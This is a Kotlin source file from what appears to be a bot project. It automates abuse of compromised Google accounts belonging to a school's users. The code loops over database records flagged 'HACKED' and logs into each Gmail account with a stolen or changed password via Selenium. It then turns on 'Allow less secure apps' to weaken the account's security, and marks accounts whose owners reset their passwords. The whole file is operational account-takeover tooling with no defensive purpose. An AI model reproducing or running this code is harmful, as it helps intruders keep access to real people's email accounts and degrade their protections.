package net.scr0pt.bot.google

import com.mongodb.client.MongoClients
import com.mongodb.client.MongoCollection
import com.mongodb.client.model.Updates
import net.scr0pt.bot.PageResponse
import net.scr0pt.crawl.school.random
import net.scr0pt.thirdservice.mlab.loginGoogle
import net.scr0pt.thirdservice.mongodb.MongoConnection
import net.scr0pt.utils.webdriver.Browser
import net.scr0pt.utils.webdriver.findFirstElWait
import org.bson.Document
import org.openqa.selenium.firefox.FirefoxDriver

/**
 * Created by Long
 * Date: 10/22/2019
 * Time: 10:24 PM
 */


suspend fun main() {
    val mongoClient = MongoClients.create(MongoConnection.eduConnection)
    val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
    val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")

    while (true){
        collection.random(org.bson.Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))?.let {
            if(it.containsKey("Allow less secure apps")) return
            val gmailUsername = it.getString("email")
            val recover_email: String? = it.getString("recover_email")
            val gmailPassword = it.getString("new_pass") ?: it.getString("pass")

            val driver = Browser.firefox
            loginGoogle(gmailUsername, gmailPassword, driver, onLoginSuccess = {
                driver.get("https://myaccount.google.com/lesssecureapps?utm_source=google-account&utm_medium=web")
                var accessTxt = driver.findFirstElWait(1000, 180000, "div", jsoup = false, filter = { el -> el.text.startsWith("Allow less secure apps: ") || el.text.startsWith("Cho phép ứng dụng kém an toàn: ") })?.text
                        ?: return@loginGoogle
                if (accessTxt == "Allow less secure apps: ON" || accessTxt == "Cho phép ứng dụng kém an toàn: BẬT") {
                    onSuccess(gmailUsername, collection, driver)
                } else if (accessTxt == "Allow less secure apps: OFF" || accessTxt == "Cho phép ứng dụng kém an toàn: TẮT") {
                    driver.findFirstElWait(1000, 120000, ".LsSwGf", jsoup = false)?.click()
                    Thread.sleep(2000)
                    driver.navigate().refresh()
                    Thread.sleep(2000)

                    accessTxt = driver.findFirstElWait(1000, 180000, "div", jsoup = false, filter = { el -> el.text.startsWith("Allow less secure apps: ") || el.text.startsWith("Cho phép ứng dụng kém an toàn: ") })?.text
                            ?: return@loginGoogle
                    if (accessTxt == "Allow less secure apps: ON" || accessTxt == "Cho phép ứng dụng kém an toàn: BẬT") {
                        onSuccess(gmailUsername, collection,driver)
                    }
                }
            }, onLoginFail = {response ->

                if(response is PageResponse.PASSWORD_CHANGED || response is PageResponse.INCORECT_PASSWORD){
                    collection.updateOne(Document("email", gmailUsername), Updates.combine(
                            Updates.set("login_status", "PASSWORD_CHANGED"),
                            Updates.set("email_status", null)
                    ))
                } else {
                    print(response)
                }
            }, recoverEmail = recover_email)
        }
    }
}

fun onSuccess(gmailUsername: String, collection: MongoCollection<Document>, driver: FirefoxDriver) {
    println("Allow less secure apps true")
    collection.updateOne(Document("email", gmailUsername), Updates.set("Allow less secure apps", true))
    driver.close()
}
